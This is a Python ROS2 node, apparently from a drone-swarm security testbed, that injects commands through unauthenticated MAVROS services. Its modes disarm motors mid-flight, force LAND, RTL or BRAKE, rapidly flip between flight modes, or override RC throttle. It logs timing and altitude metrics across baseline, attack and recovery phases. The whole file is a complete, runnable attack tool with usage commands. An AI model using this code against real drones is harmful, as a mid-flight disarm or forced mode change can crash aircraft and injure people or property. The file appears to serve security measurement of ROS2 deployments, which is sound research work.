#!/usr/bin/env python3
"""
Layer 2 Attack: MAVROS Command Injection — Flight Mode & Arm/Disarm Override

Exploits the unauthenticated MAVROS service interface to inject flight
commands. With SROS2 disabled, any DDS participant can call any ROS2
service — including safety-critical ones like mode switching and disarming.

Attack modes:
  - disarm:     Call /mavros/cmd/arming with value=False → motors stop mid-flight → crash
  - land:       Call /mavros/set_mode with custom_mode='LAND' → forced landing
  - rtl:        Call /mavros/set_mode with custom_mode='RTL' → return to launch (disrupts mission)
  - brake:      Call /mavros/set_mode with custom_mode='BRAKE' → immediate stop
  - flip_flop:  Rapidly alternate between GUIDED and LAND → confuse flight controller
  - rc_override: Publish RC channel overrides to take manual control

The attacker only needs to CALL services or PUBLISH to topics on the DDS
network (SROS2 disabled). No interception or modification required.

Unlike the setpoint hijacker (which competes for control), this attack
uses the COMMAND interface — mode switches and arm/disarm are authoritative,
not competitive. A single disarm command is an instant kill.

Usage:
  # Disarm mid-flight (instant motor kill)
  ros2 run swarm_mission mavros_cmd_injector --ros-args \
    -p target_drone:=drone1 \
    -p mode:=disarm

  # Force landing
  ros2 run swarm_mission mavros_cmd_injector --ros-args \
    -p target_drone:=drone1 \
    -p mode:=land

  # Flip-flop between modes (disruption)
  ros2 run swarm_mission mavros_cmd_injector --ros-args \
    -p target_drone:=drone1 \
    -p mode:=flip_flop \
    -p flip_interval:=2.0

Output:
  - CSV: ~/mavros_cmd_metrics_<drone>_<timestamp>.csv
"""
import csv
import math
import os
import time
from datetime import datetime

import rclpy
from rclpy.node import Node
from rclpy.qos import QoSProfile, ReliabilityPolicy, HistoryPolicy, DurabilityPolicy
from geometry_msgs.msg import PoseStamped
from sensor_msgs.msg import Imu
from mavros_msgs.srv import CommandBool, SetMode
from mavros_msgs.msg import OverrideRCIn, State


class MavrosCmdInjector(Node):
    def __init__(self):
        super().__init__('mavros_cmd_injector')

        # ---- Parameters ----
        self.declare_parameter('target_drone', 'drone1')
        self.declare_parameter('mode', 'land')             # disarm | land | rtl | brake | flip_flop | rc_override
        self.declare_parameter('baseline_duration', 10.0)
        self.declare_parameter('attack_duration', 30.0)
        self.declare_parameter('recovery_duration', 20.0)
        self.declare_parameter('flip_interval', 2.0)        # seconds between mode flips
        self.declare_parameter('repeat_interval', 1.0)       # how often to resend command
        self.declare_parameter('rc_throttle', 1000)          # RC throttle value (1000=min, 2000=max)
        self.declare_parameter('output_dir', os.path.expanduser('~'))

        self.target_drone = self.get_parameter('target_drone').value
        self.attack_mode = self.get_parameter('mode').value
        self.baseline_dur = self.get_parameter('baseline_duration').value
        self.attack_dur = self.get_parameter('attack_duration').value
        self.recovery_dur = self.get_parameter('recovery_duration').value
        self.flip_interval = self.get_parameter('flip_interval').value
        self.repeat_interval = self.get_parameter('repeat_interval').value
        self.rc_throttle = self.get_parameter('rc_throttle').value
        self.output_dir = self.get_parameter('output_dir').value

        # ---- Service / topic namespaces ----
        if self.target_drone == 'drone1':
            self.ns = '/mavros'
        else:
            self.ns = f'/{self.target_drone}/mavros'

        # ---- State ----
        self.phase = 'baseline'
        self.phase_start_time = None
        self.drone_pose = None
        self.attack_origin = None
        self.drone_state = None
        self.inject_timer = None
        self.cmd_count = 0
        self.flip_state = False  # for flip_flop mode

        # Single-shot timing
        self.cmd_sent_time = None         # monotonic time when command was sent
        self.mode_changed_time = None     # monotonic time when mode changed
        self.disarm_detected_time = None  # monotonic time when armed=False detected
        self.was_armed = None             # track armed transitions
        self.prev_mode = None             # track mode transitions
        self.attack_start_altitude = None

        # Metrics
        self.metrics = []
        self.metric_interval = 0.5       # faster sampling for precise timing
        self.last_metric_time = 0.0
        self.events = []   # log each command sent

        # ---- QoS ----
        qos_besteffort = QoSProfile(
            reliability=ReliabilityPolicy.BEST_EFFORT,
            history=HistoryPolicy.KEEP_LAST,
            durability=DurabilityPolicy.VOLATILE,
            depth=5)

        # ---- Service clients ----
        self.arming_client = self.create_client(
            CommandBool, f'{self.ns}/cmd/arming')
        self.set_mode_client = self.create_client(
            SetMode, f'{self.ns}/set_mode')

        # ---- Subscribers ----
        # Monitor drone position
        self.pose_sub = self.create_subscription(
            PoseStamped, f'{self.ns}/local_position/pose',
            self.pose_callback, qos_besteffort)

        # Monitor drone state (armed, mode)
        self.state_sub = self.create_subscription(
            State, f'{self.ns}/state',
            self.state_callback, 10)

        # ---- RC override publisher (for rc_override mode) ----
        self.rc_pub = self.create_publisher(
            OverrideRCIn, f'{self.ns}/rc/override', 10)

        # ---- Phase timer ----
        self.phase_timer = self.create_timer(0.5, self.phase_tick)

        # CSV
        timestamp_str = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.csv_path = os.path.join(
            self.output_dir,
            f'mavros_cmd_metrics_{self.target_drone}_{timestamp_str}.csv')

        mode_desc = {
            'disarm': 'DISARM (motor kill mid-flight)',
            'land': 'LAND (forced mode switch)',
            'rtl': 'RTL (return to launch)',
            'brake': 'BRAKE (immediate stop)',
            'flip_flop': f'FLIP-FLOP (GUIDED↔LAND every {self.flip_interval}s)',
            'rc_override': f'RC OVERRIDE (throttle={self.rc_throttle})',
        }.get(self.attack_mode, self.attack_mode)

        self.get_logger().info(
            f'=== MAVROS Command Injection Attack ===\n'
            f'  Target: {self.target_drone}\n'
            f'  Namespace: {self.ns}\n'
            f'  Mode: {mode_desc}\n'
            f'  Phases: baseline={self.baseline_dur}s, '
            f'attack={self.attack_dur}s, recovery={self.recovery_dur}s\n'
            f'  CSV: {self.csv_path}\n'
            f'  Starting BASELINE phase...')

        self.phase_start_time = time.monotonic()

    # ---- Callbacks ----

    def pose_callback(self, msg: PoseStamped):
        self.drone_pose = msg.pose

    def state_callback(self, msg: State):
        # Detect mode change
        if (self.prev_mode is not None and
                self.prev_mode != msg.mode and
                self.phase == 'attack' and
                self.mode_changed_time is None):
            self.mode_changed_time = time.monotonic()
            dt = self.mode_changed_time - self.cmd_sent_time if self.cmd_sent_time else 0
            self.get_logger().warn(
                f'MODE CHANGED: {self.prev_mode} -> {msg.mode} '
                f'({dt:.3f}s after command)')
            self._log_event(f'MODE_CHANGE_{self.prev_mode}_TO_{msg.mode}')

        # Detect disarm transition
        if (self.was_armed is True and msg.armed is False and
                self.disarm_detected_time is None):
            self.disarm_detected_time = time.monotonic()
            dt_from_cmd = (self.disarm_detected_time - self.cmd_sent_time
                           if self.cmd_sent_time else 0)
            dt_from_mode = (self.disarm_detected_time - self.mode_changed_time
                            if self.mode_changed_time else 0)
            self.get_logger().warn(
                f'DISARMED! Time from command: {dt_from_cmd:.3f}s | '
                f'Time from mode change: {dt_from_mode:.3f}s')
            self._log_event(f'DISARM_DETECTED_{dt_from_cmd:.3f}s')

        self.was_armed = msg.armed
        self.prev_mode = msg.mode
        self.drone_state = msg

    # ---- Attack commands ----

    def send_attack_cmd(self):
        """Send the attack command based on mode."""
        if self.attack_mode == 'disarm':
            self._send_disarm()
        elif self.attack_mode == 'land':
            self._send_mode('LAND')
        elif self.attack_mode == 'rtl':
            self._send_mode('RTL')
        elif self.attack_mode == 'brake':
            self._send_mode('BRAKE')
        elif self.attack_mode == 'flip_flop':
            self._send_flip_flop()
        elif self.attack_mode == 'rc_override':
            self._send_rc_override()

    def _send_disarm(self):
        """Send disarm command — motors stop immediately."""
        if not self.arming_client.service_is_ready():
            self.get_logger().warn('Arming service not ready')
            return

        req = CommandBool.Request()
        req.value = False  # disarm

        future = self.arming_client.call_async(req)
        future.add_done_callback(self._disarm_callback)
        self.cmd_count += 1
        self._log_event('DISARM_CMD')

    def _disarm_callback(self, future):
        try:
            resp = future.result()
            success = resp.success
            result = resp.result
            self.get_logger().warn(
                f'DISARM response: success={success}, result={result}')
            self._log_event(f'DISARM_RESP_{"OK" if success else "FAIL"}')
        except Exception as e:
            self.get_logger().error(f'Disarm call failed: {e}')
            self._log_event(f'DISARM_ERROR')

    def _send_mode(self, mode_name):
        """Send mode switch command."""
        if not self.set_mode_client.service_is_ready():
            self.get_logger().warn('SetMode service not ready')
            return

        req = SetMode.Request()
        req.custom_mode = mode_name

        future = self.set_mode_client.call_async(req)
        future.add_done_callback(
            lambda f: self._mode_callback(f, mode_name))
        self.cmd_count += 1
        self._log_event(f'MODE_CMD_{mode_name}')

    def _mode_callback(self, future, mode_name):
        try:
            resp = future.result()
            success = resp.mode_sent
            self.get_logger().warn(
                f'SET_MODE {mode_name} response: mode_sent={success}')
            self._log_event(
                f'MODE_RESP_{mode_name}_{"OK" if success else "FAIL"}')
        except Exception as e:
            self.get_logger().error(f'SetMode call failed: {e}')
            self._log_event(f'MODE_ERROR_{mode_name}')

    def _send_flip_flop(self):
        """Alternate between GUIDED and LAND."""
        if self.flip_state:
            self._send_mode('GUIDED')
        else:
            self._send_mode('LAND')
        self.flip_state = not self.flip_state

    def _send_rc_override(self):
        """Publish RC channel overrides."""
        msg = OverrideRCIn()
        # Channels: 1=roll, 2=pitch, 3=throttle, 4=yaw, 5-8=aux
        # 1000=min, 1500=center, 2000=max, 0=release, 65535=ignore
        msg.channels = [
            65535,              # roll — no override
            65535,              # pitch — no override
            self.rc_throttle,   # throttle — override to min (1000) = descend
            65535,              # yaw — no override
            65535, 65535, 65535, 65535,  # aux
            65535, 65535, 65535, 65535,  # aux extended
            65535, 65535, 65535, 65535,
            65535, 65535,
        ]
        self.rc_pub.publish(msg)
        self.cmd_count += 1
        self._log_event(f'RC_OVERRIDE_THR={self.rc_throttle}')

    def _log_event(self, event_type):
        """Log a command event."""
        state_str = ''
        if self.drone_state is not None:
            state_str = (f'armed={self.drone_state.armed}, '
                         f'mode={self.drone_state.mode}')

        pos_str = ''
        if self.drone_pose is not None:
            pos_str = (f'({self.drone_pose.position.x:.2f}, '
                       f'{self.drone_pose.position.y:.2f}, '
                       f'{self.drone_pose.position.z:.2f})')

        self.events.append({
            'timestamp': datetime.now().isoformat(),
            'phase': self.phase,
            'event': event_type,
            'cmd_count': self.cmd_count,
            'drone_armed': self.drone_state.armed if self.drone_state else None,
            'drone_mode': self.drone_state.mode if self.drone_state else None,
            'drone_x': round(self.drone_pose.position.x, 3) if self.drone_pose else None,
            'drone_y': round(self.drone_pose.position.y, 3) if self.drone_pose else None,
            'drone_z': round(self.drone_pose.position.z, 3) if self.drone_pose else None,
        })

    # ---- Phase management ----

    def phase_tick(self):
        now = time.monotonic()
        elapsed = now - self.phase_start_time

        displacement = None
        if self.attack_origin is not None and self.drone_pose is not None:
            dx = self.drone_pose.position.x - self.attack_origin.position.x
            dy = self.drone_pose.position.y - self.attack_origin.position.y
            dz = self.drone_pose.position.z - self.attack_origin.position.z
            displacement = math.sqrt(dx**2 + dy**2 + dz**2)

        # Log metrics
        if now - self.last_metric_time >= self.metric_interval:
            self.last_metric_time = now

            metric = {
                'timestamp': datetime.now().isoformat(),
                'phase': self.phase,
                'phase_elapsed_s': round(elapsed, 2),
                'cmd_count': self.cmd_count,
                'displacement_m': round(displacement, 3) if displacement is not None else None,
                'drone_armed': self.drone_state.armed if self.drone_state else None,
                'drone_mode': self.drone_state.mode if self.drone_state else None,
            }
            if self.drone_pose is not None:
                metric['drone_x'] = round(self.drone_pose.position.x, 3)
                metric['drone_y'] = round(self.drone_pose.position.y, 3)
                metric['drone_z'] = round(self.drone_pose.position.z, 3)

            self.metrics.append(metric)

            phase_char = {
                'baseline': '[B]', 'attack': '[A]', 'recovery': '[R]'
            }.get(self.phase, '[?]')

            pos_str = ''
            if self.drone_pose is not None:
                pos_str = (f'pos: ({self.drone_pose.position.x:.1f}, '
                           f'{self.drone_pose.position.y:.1f}, '
                           f'{self.drone_pose.position.z:.1f})')

            state_str = ''
            if self.drone_state is not None:
                state_str = (f'armed={self.drone_state.armed} '
                             f'mode={self.drone_state.mode}')

            disp_str = f'disp: {displacement:.2f}m' if displacement is not None else ''

            self.get_logger().info(
                f'{phase_char} {elapsed:.0f}s | {pos_str} | '
                f'{state_str} | {disp_str} | cmds: {self.cmd_count}')

        # Phase transitions
        if self.phase == 'baseline' and elapsed >= self.baseline_dur:
            self._start_attack()
        elif self.phase == 'attack' and elapsed >= self.attack_dur:
            self._start_recovery()
        elif self.phase == 'recovery' and elapsed >= self.recovery_dur:
            self._finish()

    def _start_attack(self):
        self.phase = 'attack'
        self.phase_start_time = time.monotonic()

        if self.drone_pose is not None:
            from geometry_msgs.msg import Pose
            self.attack_origin = Pose()
            self.attack_origin.position.x = self.drone_pose.position.x
            self.attack_origin.position.y = self.drone_pose.position.y
            self.attack_origin.position.z = self.drone_pose.position.z
            self.attack_start_altitude = self.drone_pose.position.z

        state_str = ''
        if self.drone_state is not None:
            state_str = f'Current state: armed={self.drone_state.armed}, mode={self.drone_state.mode}'

        # Single-shot modes: send ONE command, then just monitor
        if self.attack_mode in ('land', 'rtl', 'brake', 'disarm'):
            self.cmd_sent_time = time.monotonic()
            self.send_attack_cmd()  # single command

            self.get_logger().warn(
                f'=== ATTACK PHASE — SINGLE {self.attack_mode.upper()} COMMAND SENT ===\n'
                f'  {state_str}\n'
                f'  Monitoring for mode change and disarm...')

        else:
            # Repeating modes: flip_flop, rc_override
            if self.attack_mode == 'flip_flop':
                period = self.flip_interval
            elif self.attack_mode == 'rc_override':
                period = 0.05  # 20 Hz
            else:
                period = self.repeat_interval

            self.inject_timer = self.create_timer(period, self.send_attack_cmd)
            self.cmd_sent_time = time.monotonic()
            self.send_attack_cmd()

            self.get_logger().warn(
                f'=== ATTACK PHASE — {self.attack_mode.upper()} ===\n'
                f'  {state_str}')

    def _start_recovery(self):
        self.phase = 'recovery'
        self.phase_start_time = time.monotonic()

        if self.inject_timer is not None:
            self.inject_timer.cancel()
            self.destroy_timer(self.inject_timer)
            self.inject_timer = None

        # For RC override, release all channels
        if self.attack_mode == 'rc_override':
            msg = OverrideRCIn()
            msg.channels = [0] * 18  # 0 = release
            self.rc_pub.publish(msg)

        self.get_logger().warn('=== RECOVERY PHASE — Attack stopped ===')

    def _finish(self):
        self.phase = 'done'
        self.phase_timer.cancel()
        self._write_csv()

        attack_disps = [m['displacement_m'] for m in self.metrics
                        if m['phase'] == 'attack' and m['displacement_m'] is not None]
        max_disp = max(attack_disps) if attack_disps else 0

        # Check if drone was disarmed during attack
        disarmed_during_attack = any(
            m.get('drone_armed') == False
            for m in self.metrics if m['phase'] == 'attack')

        # Check mode changes
        modes_during_attack = set(
            m.get('drone_mode') for m in self.metrics
            if m['phase'] == 'attack' and m.get('drone_mode'))

        min_z = None
        for m in self.metrics:
            if m['phase'] in ('attack', 'recovery') and 'drone_z' in m:
                if min_z is None or m['drone_z'] < min_z:
                    min_z = m['drone_z']

        min_z_str = f'{min_z:>6.2f}m' if min_z is not None else '  N/A '

        # Timing calculations
        time_to_mode_change = None
        if self.cmd_sent_time and self.mode_changed_time:
            time_to_mode_change = self.mode_changed_time - self.cmd_sent_time

        time_to_disarm = None
        if self.cmd_sent_time and self.disarm_detected_time:
            time_to_disarm = self.disarm_detected_time - self.cmd_sent_time

        time_mode_to_disarm = None
        if self.mode_changed_time and self.disarm_detected_time:
            time_mode_to_disarm = self.disarm_detected_time - self.mode_changed_time

        ttm_str = f'{time_to_mode_change:>6.3f}s' if time_to_mode_change is not None else '  N/A '
        ttd_str = f'{time_to_disarm:>6.3f}s' if time_to_disarm is not None else '  N/A '
        tmd_str = f'{time_mode_to_disarm:>6.3f}s' if time_mode_to_disarm is not None else '  N/A '
        alt_str = f'{self.attack_start_altitude:>6.2f}m' if self.attack_start_altitude is not None else '  N/A '

        self.get_logger().warn(
            f'\n'
            f'╔═══════════════════════════════════════════════╗\n'
            f'║      MAVROS COMMAND INJECTION RESULTS          ║\n'
            f'╠═══════════════════════════════════════════════╣\n'
            f'║ Target: {self.target_drone:<38}║\n'
            f'║ Attack: {self.attack_mode:<38}║\n'
            f'║ Commands sent:          {self.cmd_count:>6d}                ║\n'
            f'║ Start altitude:         {alt_str}               ║\n'
            f'║ Min altitude:           {min_z_str}               ║\n'
            f'║ Max displacement:       {max_disp:>6.2f}m               ║\n'
            f'║ Disarmed in attack:     {"YES" if disarmed_during_attack else "NO":>6}                ║\n'
            f'║ Modes seen:             {", ".join(modes_during_attack) if modes_during_attack else "N/A":<22}║\n'
            f'╠═══════════════════════════════════════════════╣\n'
            f'║ TIMING                                         ║\n'
            f'║ Cmd → mode change:      {ttm_str}               ║\n'
            f'║ Cmd → motors disarmed:  {ttd_str}               ║\n'
            f'║ Mode change → disarm:   {tmd_str}               ║\n'
            f'╚═══════════════════════════════════════════════╝\n'
            f'\n'
            f'CSV saved: {self.csv_path}')

    def _write_csv(self):
        # Write metrics CSV
        if self.metrics:
            # Add timing summary to last metric row
            if self.metrics:
                last = self.metrics[-1]
                if self.cmd_sent_time and self.mode_changed_time:
                    last['time_to_mode_change_s'] = round(
                        self.mode_changed_time - self.cmd_sent_time, 3)
                if self.cmd_sent_time and self.disarm_detected_time:
                    last['time_to_disarm_s'] = round(
                        self.disarm_detected_time - self.cmd_sent_time, 3)

            fieldnames = ['timestamp', 'phase', 'phase_elapsed_s', 'cmd_count',
                          'displacement_m', 'drone_armed', 'drone_mode',
                          'drone_x', 'drone_y', 'drone_z',
                          'time_to_mode_change_s', 'time_to_disarm_s']
            try:
                with open(self.csv_path, 'w', newline='') as f:
                    writer = csv.DictWriter(f, fieldnames=fieldnames,
                                            extrasaction='ignore')
                    writer.writeheader()
                    writer.writerows(self.metrics)
                self.get_logger().info(
                    f'Wrote {len(self.metrics)} metric rows to {self.csv_path}')
            except Exception as e:
                self.get_logger().error(f'Failed to write CSV: {e}')

        # Write events CSV
        if self.events:
            events_path = self.csv_path.replace('.csv', '_events.csv')
            fieldnames = ['timestamp', 'phase', 'event', 'cmd_count',
                          'drone_armed', 'drone_mode',
                          'drone_x', 'drone_y', 'drone_z']
            try:
                with open(events_path, 'w', newline='') as f:
                    writer = csv.DictWriter(f, fieldnames=fieldnames,
                                            extrasaction='ignore')
                    writer.writeheader()
                    writer.writerows(self.events)
                self.get_logger().info(
                    f'Wrote {len(self.events)} events to {events_path}')
            except Exception as e:
                self.get_logger().error(f'Failed to write events CSV: {e}')


def main(args=None):
    rclpy.init(args=args)
    node = MavrosCmdInjector()
    try:
        rclpy.spin(node)
    except KeyboardInterrupt:
        if node.phase != 'done':
            node.get_logger().warn('Interrupted — writing partial metrics...')
            node._write_csv()
        node.get_logger().info(
            f'Shutting down — {node.cmd_count} commands sent')
    finally:
        if node.inject_timer is not None:
            node.inject_timer.cancel()
        node.destroy_node()
        rclpy.shutdown()


if __name__ == '__main__':
    main()
